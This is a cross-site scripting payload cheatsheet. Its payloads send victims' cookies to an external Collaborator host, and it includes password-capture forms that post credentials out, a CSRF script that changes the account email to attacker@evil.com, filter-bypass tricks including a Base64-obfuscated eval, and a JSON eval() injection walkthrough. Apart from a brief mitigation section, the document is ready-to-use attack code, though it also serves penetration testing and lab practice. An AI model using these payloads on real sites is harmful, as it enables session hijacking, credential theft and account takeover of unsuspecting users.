# ⚡ XSS Payloads & Exploitation Cheatsheet

A structured collection of context-specific payloads, exfiltration techniques, filter bypasses, and DOM-based JSON evaluation exploits.

---

## 📌 1. Cookie Stealers

### Basic Cookie Stealer
Redirects the victim's browser directly to your Collaborator instance with cookies appended in the query string.
<pre><code>&lt;script&gt;document.location='http://burp.oastify.com/?c='+document.cookie&lt;/script&gt;</code></pre>

### Image-Based Exfiltration
Creates an inline image element to exfiltrate cookies silently via a GET request without causing a full page redirect.
<pre><code>&lt;script&gt;document.write('&lt;img src="http://burp.oastify.com?c='+document.cookie+'" /&gt;');&lt;/script&gt;</code></pre>

### Fetch-Based Exfiltration
Uses the Fetch API with Base64 encoding (`btoa`) to safely transmit cookie data containing special characters.
<pre><code>&lt;script&gt;fetch('http://burp.oastify.com?c='+btoa(document.cookie))&lt;/script&gt;</code></pre>

---

## 📌 2. Context-Specific Payloads

### Breaking Out of Select Tag
Breaks out of an HTML `<select>` option context and injects a script tag.
<pre><code>"&gt;&lt;/select&gt;&lt;script&gt;document.location='http://burp.oastify.com/?c='+document.cookie&lt;/script&gt;</code></pre>

### AngularJS Expression Injection
Executes dynamic code in environments running legacy AngularJS by accessing the function constructor.
<pre><code>{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}</code></pre>

### Reflected DOM XSS
Escapes JavaScript string literals inside inline scripts and fires a fetch request.
<pre><code>\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//</code></pre>

### Stored DOM (First Bracket Bypass)
Leverages malformed HTML tag syntax (`<>`) to bypass simple input regex filters while executing via `onerror`.
<pre><code>&lt;&gt;&lt;img src=1 onerror="window.location='http://burp.oastify.com/?c='+document.cookie"&gt;</code></pre>

---

## 📌 3. Password Capture

### Basic Form Capture
Injects hidden input fields and attaches an `onchange` listener to send credentials directly to Collaborator upon user input.
<pre><code>&lt;input name=username id=username&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('http://burp.oastify.com',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});"&gt;</code></pre>

### Password Capture with Autocomplete Support
Triggers credential capture when password managers automatically fill out saved credentials.
<pre><code>&lt;input name="username" id="username" autocomplete="username"&gt;
&lt;input type="password" id="password" name="password" autocomplete="password"
  onchange="if(this.value.length)fetch('http://burp.oastify.com',{
    method:'POST',
    mode: 'no-cors',
    body:username.value+':'+this.value
  });"&gt;</code></pre>

---

## 📌 4. CSRF via XSS

Executes an inline script that fetches a CSRF token from `/my-account` and automatically sends a POST request to update the user's email address.

<pre><code>&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
  var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
  var changeReq = new XMLHttpRequest();
  changeReq.open('post', '/my-account/change-email', true);
  changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  changeReq.send('csrf='+token+'&amp;email=attacker@evil.com');
}
&lt;/script&gt;</code></pre>

---

## 📌 5. Bypass Techniques

### Case Variation
Bypasses basic case-sensitive `<script>` tag filters.
<pre><code>&lt;/ScRiPt &gt;&lt;ScRiPt &gt;document.write('&lt;img src="http://burp.oastify.com?c='+document.cookie+'" /&gt;');&lt;/ScRiPt &gt;</code></pre>

### Bracket Notation
Bypasses execution filters blocking dot notation (`document.cookie` or `window.alert`).
<pre><code>"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"</code></pre>

### Base64 Eval
Decodes and executes a Base64 encoded payload to bypass string/keyword filters.
<pre><code>"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//</code></pre>

---

## 📌 6. DOM-Based XSS via JSON Injection into eval()

### Vulnerability Overview
The application uses `eval()` to parse JSON responses containing user input instead of `JSON.parse()`, allowing JavaScript code injection through double backslash escaping.

### Vulnerable Code Pattern
<pre><code>xhr.onreadystatechange = function() {
    if (this.readyState == 4 &amp;&amp; this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);
        displaySearchResults(searchResultsObj);
    }
};</code></pre>

### Attack Payloads

#### Primary Exfiltration Payload
<pre><code>/?search=\%22};fetch(`https://YOUR-COLLABORATOR.com?c=${document.cookie}`);//</code></pre>

#### Alternative Payloads
* **Image Exfiltration:**
  <pre><code>/?search=\%22};new%20Image().src=`https://YOUR-COLLABORATOR.com?c=${document.cookie}`;//</code></pre>
* **Redirect Exfiltration:**
  <pre><code>/?search=\%22};document.location=`https://YOUR-COLLABORATOR.com?c=${document.cookie}`;//</code></pre>
* **PoC Alert:**
  <pre><code>/?search=\%22};alert(document.domain);//</code></pre>

### How It Works

1. **URL Input:** `search=\%22};fetch(`https://...`);//`
2. **Server JSON Response:** `{"results":[],"searchTerm":"\\"};fetch(`https://...`);//"}`
3. **Executed JS in eval():**
   <pre><code>var searchResultsObj = {"results":[],"searchTerm":"\\"};fetch(`https://...`);//"}</code></pre>

* **Double Escaping Mechanism:** 
  * In URL: `\%22` (Backslash + Encoded Quote)
  * In Server JSON Response: `\\"` (Escaped Backslash + Quote)
  * Inside `eval()` execution context: `\\"` becomes literal `\"`. The trailing `"` breaks out of the JavaScript string literal for `searchTerm`, `}` closes the object, `;` terminates the variable statement, `fetch(...)` executes arbitrary JavaScript, and `//` comments out the remaining `"}`.

### Mitigation & Root Cause
* **Root Cause:** Insecure use of `eval()` to parse dynamic JSON structures combined with inadequate server-side backslash sanitization.
* **Remediation:** Replace all instances of `eval()` with `JSON.parse()`, implement strict output encoding, and deploy a robust Content Security Policy (CSP).

---

## 🗄️ Quick Reference Table

| Target Context | Trigger / Technique | Vector Example | Key Objective |
| :--- | :--- | :--- | :--- |
| **Basic HTML** | `<script>` Tag | `<script>fetch(...)</script>` | Cookie Stealer |
| **Select Tag** | Breakout | `"></select><script>...</script>` | Context Breakout |
| **Angular JS** | Sandbox / Expression | `{{constructor.constructor(...)()}}` | Angular RCE / XSS |
| **DOM JSON** | `eval()` String Breakout | `/\%22};alert(1);//` | DOM XSS via JSON |
| **Forms / Auth** | `onchange` Event | `<input type=password onchange=...> ` | Password Capture |
| **WAF / Filter** | Base64 Encoding | `eval(atob('...'))` | Payload Obfuscation |
